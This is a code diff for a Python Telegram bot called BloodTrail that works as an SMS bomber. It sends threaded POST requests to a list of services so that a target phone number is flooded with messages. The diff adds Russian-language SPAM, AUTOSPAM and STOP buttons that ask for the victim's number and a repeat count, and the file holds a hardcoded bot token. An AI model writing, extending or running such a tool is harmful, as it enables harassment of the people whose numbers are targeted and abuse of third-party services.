@@ -2,11 +2,9 @@ from threading import Thread
 import requests
 import json
 import sys
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
 import logging
-
-__version__ = "1.3"
 
 # Set up logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
@@ -17,21 +15,14 @@ TOKEN = "7618261878:AAGyoMuFThdLwOMbcBIR9W9rqo2wq2abVlA"
 
 class BloodTrail:
     def __init__(self, number):
+        self.stop_spam = False
         try:
             with open("data.json", "r", encoding="utf-8") as f:
                 self.data = json.load(f)
-            if number == "":
-                if self.data["last_used_number"]:
-                    self.number = self.data["last_used_number"]
-                    print(f"{'USING LATEST NUMBER :': >40} {self.data['last_used_number']}")
-                else:
-                    print(f"{'ERROR :': >40} write number as a target to save it")
-                    sys.exit()
-            else:
-                self.number = number
-                self.data["last_used_number"] = self.number
-                with open("data.json", "w", encoding="utf-8") as j:
-                    json.dump(obj=self.data, fp=j, ensure_ascii=False, indent=4)
+            self.number = number
+            self.data["last_used_number"] = self.number
+            with open("data.json", "w", encoding="utf-8") as j:
+                json.dump(obj=self.data, fp=j, ensure_ascii=False, indent=4)
         except FileNotFoundError:
             print(f"ERROR: data.json file not found.")
             sys.exit()
@@ -46,15 +37,18 @@ class BloodTrail:
     @staticmethod
     def post_request(service, url, data=None, json_data=None):
         if json_data:
-            r = requests.post(url=url, json=json_data)
+            requests.post(url=url, json=json_data)
         else:
-            r = requests.post(url=url, data=data)
-        print(f"{'REQUEST STATUS OF ' + service + ' :': >40} {r.status_code}")
+            requests.post(url=url, data=data)
 
     def start_threads(self, repeats=1):
         threads = []
         for i in range(repeats):
+            if self.stop_spam:
+                break
             for service in self.data["services"]:
+                if self.stop_spam:
+                    break
                 data_type = self.data["services"][service]["data_type"]
                 if data_type == "json":
                     t = Thread(target=self.post_request, args=(service,
@@ -72,30 +66,89 @@ class BloodTrail:
         for thread in threads:
             thread.join()
 
-# Function to start the bot
+    def stop(self):
+        self.stop_spam = True
+
+# Start command with SPAM and AUTOSPAM buttons
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Welcome to SecretCall SMS Bot! Use /spam <phone_number> <repeats> to start spamming.")
+    keyboard = [
+        [InlineKeyboardButton("SPAM", callback_data='spam'), InlineKeyboardButton("AUTOSPAM", callback_data='autospam')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text("Добро пожаловать в Секретный бот! Выберите 'SPAM' или 'AUTOSPAM'.", reply_markup=reply_markup)
 
-# Function to handle the /spam command
-async def spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        args = context.args
-        if len(args) < 2:
-            await update.message.reply_text("Usage: /spam <phone_number> <repeats>")
-            return
+# Handle SPAM button
+async def spam_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
 
-        number = args[0]
-        repeats = int(args[1])
+    # Ask for phone number
+    await query.edit_message_text("Введите номер, например: +77XXXXXXXXX")
+    context.user_data['spam_state'] = 'waiting_for_number_spam'
 
-        # Run the BloodTrail class
-        bloodtrail = BloodTrail(number)
-        bloodtrail.format_data()
-        bloodtrail.start_threads(repeats)
+# Handle AUTOSPAM button
+async def autospam_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
 
-        await update.message.reply_text(f"Started spamming {number} for {repeats} times!")
-    except Exception as e:
-        logger.error(e)
-        await update.message.reply_text("An error occurred. Please check your inputs.")
+    # Ask for phone number
+    await query.edit_message_text("Введите номер, например: +77XXXXXXXXX")
+    context.user_data['spam_state'] = 'waiting_for_number_autospam'
+
+# Handle user input for SPAM and AUTOSPAM
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if 'spam_state' in context.user_data:
+        state = context.user_data['spam_state']
+        if state == 'waiting_for_number_spam':
+            context.user_data['phone_number'] = update.message.text
+            await update.message.reply_text("Введите число на спам.")
+            context.user_data['spam_state'] = 'waiting_for_repeats_spam'
+        elif state == 'waiting_for_repeats_spam':
+            try:
+                repeats = int(update.message.text)
+                phone_number = context.user_data['phone_number']
+                context.user_data['spam_state'] = None
+
+                # Run spam process
+                bloodtrail = BloodTrail(phone_number)
+                bloodtrail.format_data()
+                bloodtrail.start_threads(repeats)
+
+                await update.message.reply_text(f"Успешный спам завершён на номер {phone_number} за {repeats} раз!")
+            except ValueError:
+                await update.message.reply_text("Пожалуйста, введите корректное число.")
+        elif state == 'waiting_for_number_autospam':
+            context.user_data['phone_number'] = update.message.text
+            await update.message.reply_text("Введите число на спам.")
+            context.user_data['spam_state'] = 'waiting_for_repeats_autospam'
+        elif state == 'waiting_for_repeats_autospam':
+            try:
+                repeats = int(update.message.text)
+                phone_number = context.user_data['phone_number']
+                context.user_data['spam_state'] = None
+
+                # Show STOP button
+                keyboard = [[InlineKeyboardButton("STOP", callback_data='stop')]]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                await update.message.reply_text(f"Успешный автоспам начат на номер {phone_number}!", reply_markup=reply_markup)
+
+                # Run auto spam
+                context.user_data['spam_instance'] = BloodTrail(phone_number)
+                bloodtrail = context.user_data['spam_instance']
+                bloodtrail.format_data()
+                bloodtrail.start_threads(repeats)
+            except ValueError:
+                await update.message.reply_text("Пожалуйста, введите корректное число.")
+
+# Handle STOP button
+async def stop_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    if 'spam_instance' in context.user_data:
+        bloodtrail = context.user_data['spam_instance']
+        bloodtrail.stop()
+        await query.edit_message_text("Авто спам остановлен.")
 
 # Main function to run the bot
 def main():
@@ -103,7 +156,14 @@ def main():
 
     # Command Handlers
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("spam", spam))
+
+    # Callback query handlers
+    application.add_handler(CallbackQueryHandler(spam_button, pattern='spam'))
+    application.add_handler(CallbackQueryHandler(autospam_button, pattern='autospam'))
+    application.add_handler(CallbackQueryHandler(stop_button, pattern='stop'))
+
+    # Message handler for user input
+    application.add_handler(MessageHandler(filters.TEXT, handle_message))
 
     # Start the bot
     application.run_polling()
